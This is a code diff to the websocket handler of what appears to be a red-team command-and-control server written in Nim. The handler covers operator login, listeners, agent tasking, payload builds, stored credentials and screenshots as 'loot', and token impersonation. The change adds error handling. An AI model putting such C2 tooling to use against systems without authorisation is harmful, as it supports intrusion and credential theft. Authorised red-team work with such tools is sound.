@@ -56,120 +56,127 @@ proc websocketHandler(ws: WebSocket, event: WebSocketEvent, message: Message) {.
             # Send the public key for the key exchange, all other information with be transmitted when the key exchange is completed
             cq.sendPublicKey(cq.keyPair.publicKey, clientId = clientId)
     
-        of MessageEvent:            
-            let event = message.recvEvent(cq.clients[clientId].sessionKey)
-            case event.eventType: 
-            of CLIENT_KEY_EXCHANGE: 
-                let publicKey = decode(event.data["publicKey"].getStr()).toKey()
-                cq.clients[clientId].sessionKey = deriveSessionKey(cq.keyPair, publicKey)
-            
-            of CLIENT_AUTH:
-                let username = event.data["username"].getStr()
-                let password = event.data["password"].getStr()
-
-                # Authenticate user 
-                let auth = cq.authenticate(username, password)
-                cq.sendAuthenticationResult(auth, clientId = clientId)
-
-                if auth: 
-                    cq.clients[clientId].user = username
-                    cq.sendEventlogItem(LOG_SUCCESS_SHORT, fmt"User {username} connected.")
-
-            of CLIENT_SYNC:
-                # Synchronize data between client and server (after client authentication)
-                # C2 profile 
-                cq.sendProfile(cq.profileString, clientId = clientId)
+        of MessageEvent:  
+            try:           
+                let event = message.recvEvent(cq.clients[clientId].sessionKey)
+                case event.eventType: 
+                of CLIENT_KEY_EXCHANGE: 
+                    let publicKey = decode(event.data["publicKey"].getStr()).toKey()
+                    cq.clients[clientId].sessionKey = deriveSessionKey(cq.keyPair, publicKey)
                 
-                # Listeners
-                for id, listener in cq.listeners: 
-                    cq.sendListener(listener, clientId = clientId)
+                of CLIENT_AUTH:
+                    let username = event.data["username"].getStr()
+                    let password = event.data["password"].getStr()
+
+                    # Authenticate user 
+                    let auth = cq.authenticate(username, password)
+                    cq.sendAuthenticationResult(auth, clientId = clientId)
+
+                    if auth: 
+                        cq.clients[clientId].user = username
+                        cq.sendEventlogItem(LOG_SUCCESS_SHORT, fmt"User {username} connected.")
+
+                of CLIENT_SYNC:
+                    # Synchronize data between client and server (after client authentication)
+                    # C2 profile 
+                    cq.sendProfile(cq.profileString, clientId = clientId)
+                    
+                    # Listeners
+                    for id, listener in cq.listeners: 
+                        cq.sendListener(listener, clientId = clientId)
+                    
+                    # Agent sessions
+                    for id, agent in cq.agents: 
+                        cq.sendAgent(agent, clientId = clientId)
+
+                    # Downloads & Screenshots metadata
+                    for lootItem in cq.dbGetLoot():
+                        cq.sendLoot(lootItem, clientId = clientId)
+
+                of CLIENT_AGENT_TASK:
+                    let 
+                        agentId = event.data["agentId"].getStr()
+                        task = event.data["task"].to(Task) 
+                        command = event.data["command"].getStr()
+                        message = event.data["message"].getStr()
+                    
+                    cq.agents[agentId].tasks.add(task)
+                    cq.agents[agentId].taskCommands[task.taskId] = command.split(" ")[0]
+                    cq.sendConsoleItem(agentId, LOG_COMMAND, command)
+                    cq.sendConsoleItem(agentId, LOG_INFO, message)
+
+                of CLIENT_LISTENER_START:
+                    let listener = event.data.to(UIListener)
+                    cq.listenerStart(listener)
                 
-                # Agent sessions
-                for id, agent in cq.agents: 
-                    cq.sendAgent(agent, clientId = clientId)
+                of CLIENT_LISTENER_STOP:
+                    let listenerId = event.data["listenerId"].getStr()
+                    cq.listenerStop(listenerId)
+                    cq.sendListenerRemove(listenerId)
+                    cq.sendEventlogItem(LOG_SUCCESS_SHORT, fmt"Stopped listener {listenerId}.")
+                    cq.success("Stopped listener ", fgGreen, listenerId, resetStyle, ".")
 
-                # Downloads & Screenshots metadata
-                for lootItem in cq.dbGetLoot():
-                    cq.sendLoot(lootItem, clientId = clientId)
+                of CLIENT_AGENT_BUILD:
+                    let agentBuildInformation = event.data.to(AgentBuildInformation)
+                    let (name, payload) = cq.agentBuild(agentBuildInformation, clientId = clientId)
+                    if payload.len() != 0: 
+                        cq.sendAgentPayload(name, payload, clientId = clientId)
 
-            of CLIENT_AGENT_TASK:
-                let 
-                    agentId = event.data["agentId"].getStr()
-                    task = event.data["task"].to(Task) 
-                    command = event.data["command"].getStr()
-                    message = event.data["message"].getStr()
-                
-                cq.agents[agentId].tasks.add(task)
-                cq.agents[agentId].taskCommands[task.taskId] = command.split(" ")[0]
-                cq.sendConsoleItem(agentId, LOG_COMMAND, command)
-                cq.sendConsoleItem(agentId, LOG_INFO, message)
+                of CLIENT_AGENT_REMOVE: 
+                    let agentId = event.data["agentId"].getStr()
+                    cq.dbDeleteAgentById(agentId)
 
-            of CLIENT_LISTENER_START:
-                let listener = event.data.to(UIListener)
-                cq.listenerStart(listener)
-            
-            of CLIENT_LISTENER_STOP:
-                let listenerId = event.data["listenerId"].getStr()
-                cq.listenerStop(listenerId)
+                of CLIENT_LOOT_REMOVE: 
+                    if not cq.dbDeleteLootById(event.data["lootId"].getStr()): 
+                        cq.sendEventlogItem(LOG_ERROR, "Failed to delete loot.")
 
-            of CLIENT_AGENT_BUILD:
-                let agentBuildInformation = event.data.to(AgentBuildInformation)
-                let (name, payload) = cq.agentBuild(agentBuildInformation, clientId = clientId)
-                if payload.len() != 0: 
-                    cq.sendAgentPayload(name, payload, clientId = clientId)
+                of CLIENT_LOOT_GET: 
+                    let loot = cq.dbGetLootById(event.data["lootId"].getStr())
+                    cq.sendLootData(loot, readFile(loot.path), clientId = clientId)
 
-            of CLIENT_AGENT_REMOVE: 
-                let agentId = event.data["agentId"].getStr()
-                cq.dbDeleteAgentById(agentId)
+                of CLIENT_LOOT_MODIFY:
+                    var loot = event.data["item"].to(LootItem)
+                    if loot.lootId == "": 
+                        loot.lootId = generateUuid()
+                    if cq.agents.hasKey(loot.agentId): 
+                        loot.host = cq.agents[loot.agentId].hostname
 
-            of CLIENT_LOOT_REMOVE: 
-                if not cq.dbDeleteLootById(event.data["lootId"].getStr()): 
-                    cq.sendEventlogItem(LOG_ERROR, "Failed to delete loot.")
+                    case loot.itemType:
+                    of DOWNLOAD, SCREENSHOT:
+                        if not fileExists(loot.path):
+                            let contents = decode(event.data["contents"].getStr())
+                            createDir(fmt"{cq.lootDir}/{loot.agentId}")
+                            let path = fmt"{cq.lootDir}/{loot.agentId}/{loot.path}"
+                            writeFile(path, contents)
+                            let fileInfo = getFileInfo(path)
+                            loot.path = path
+                            loot.size = fileInfo.size.int
+                            loot.timestamp = fileInfo.creationTime.toUnix()
 
-            of CLIENT_LOOT_GET: 
-                let loot = cq.dbGetLootById(event.data["lootId"].getStr())
-                cq.sendLootData(loot, readFile(loot.path), clientId = clientId)
+                    of CREDENTIAL:
+                        if loot.timestamp == 0: 
+                            loot.timestamp = getTime().toUnix() # Set to current timestamp
 
-            of CLIENT_LOOT_MODIFY:
-                var loot = event.data["item"].to(LootItem)
-                if loot.lootId == "": 
-                    loot.lootId = generateUuid()
-                if cq.agents.hasKey(loot.agentId): 
-                    loot.host = cq.agents[loot.agentId].hostname
+                    discard cq.dbStoreLoot(loot)
+                    cq.sendLoot(loot)
 
-                case loot.itemType:
-                of DOWNLOAD, SCREENSHOT:
-                    if not fileExists(loot.path):
-                        let contents = decode(event.data["contents"].getStr())
-                        createDir(fmt"{cq.lootDir}/{loot.agentId}")
-                        let path = fmt"{cq.lootDir}/{loot.agentId}/{loot.path}"
-                        writeFile(path, contents)
-                        let fileInfo = getFileInfo(path)
-                        loot.path = path
-                        loot.size = fileInfo.size.int
-                        loot.timestamp = fileInfo.creationTime.toUnix()
+                of CLIENT_LOG:
+                    log(event.data["message"].getStr(), event.data["agentId"].getStr())
 
-                of CREDENTIAL:
-                    if loot.timestamp == 0: 
-                        loot.timestamp = getTime().toUnix() # Set to current timestamp
+                of CLIENT_CHAT: 
+                    cq.sendChatMessage(event.data["user"].getStr(), event.data["message"].getStr())
 
-                discard cq.dbStoreLoot(loot)
-                cq.sendLoot(loot)
+                of CLIENT_IMPERSONATE_TOKEN:
+                    let agentId = event.data["agentId"].getStr()
+                    cq.agents[agentId].impersonationToken =  event.data["impersonationToken"].getStr() 
+                    if cq.dbUpdateAgent(cq.agents[agentId]):
+                        # Broadcast updated token to all connected clients
+                        cq.sendImpersonationToken(agentId, cq.agents[agentId].impersonationToken)
 
-            of CLIENT_LOG:
-                log(event.data["message"].getStr(), event.data["agentId"].getStr())
+                else: discard
 
-            of CLIENT_CHAT: 
-                cq.sendChatMessage(event.data["user"].getStr(), event.data["message"].getStr())
-
-            of CLIENT_IMPERSONATE_TOKEN:
-                let agentId = event.data["agentId"].getStr()
-                cq.agents[agentId].impersonationToken =  event.data["impersonationToken"].getStr() 
-                if cq.dbUpdateAgent(cq.agents[agentId]):
-                    # Broadcast updated token to all connected clients
-                    cq.sendImpersonationToken(agentId, cq.agents[agentId].impersonationToken)
-
-            else: discard
+            except CatchableError as err:
+                cq.error(err.msg)
 
         of ErrorEvent:
             discard 
